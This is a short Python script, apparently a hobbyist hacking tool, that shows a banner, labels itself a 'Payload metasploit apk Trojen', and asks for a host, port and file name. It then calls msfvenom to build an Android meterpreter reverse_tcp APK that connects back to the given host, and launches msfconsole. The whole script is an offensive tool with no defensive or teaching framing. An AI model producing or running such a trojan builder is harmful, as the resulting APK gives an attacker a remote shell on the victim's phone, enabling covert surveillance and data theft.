import os
os.system("clear")
R  = '\33[1;31m'
G  = '\33[1;32m'
print(G+"""
 /$$$$$$$   /$$$$$$  /$$     /$$ /$$      /$$ /$$$$$$$$
| $$__  $$ /$$__  $$|  $$   /$$/| $$$    /$$$|__  $$__/
| $$  \ $$| $$  \ $$ \  $$ /$$/ | $$$$  /$$$$   | $$   
| $$$$$$$/| $$$$$$$$  \  $$$$/  | $$ $$/$$ $$   | $$   
| $$____/ | $$__  $$   \  $$/   | $$  $$$| $$   | $$   
| $$      | $$  | $$    | $$    | $$\  $ | $$   | $$   
| $$      | $$  | $$    | $$    | $$ \/  | $$   | $$   
|__/      |__/  |__/    |__/    |__/     |__/   |__/   
        
""")
print(R+"""[*] Payload metasploit apk Trojen""")
host=input(G+"[*] Enter The Host => ")
port=input(R+"[*] Enter The Port => ")
name=input(G+"[*] Enter The Name => ")
os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} R > /Desktop/{name}.apk")
os.system("msfconsole")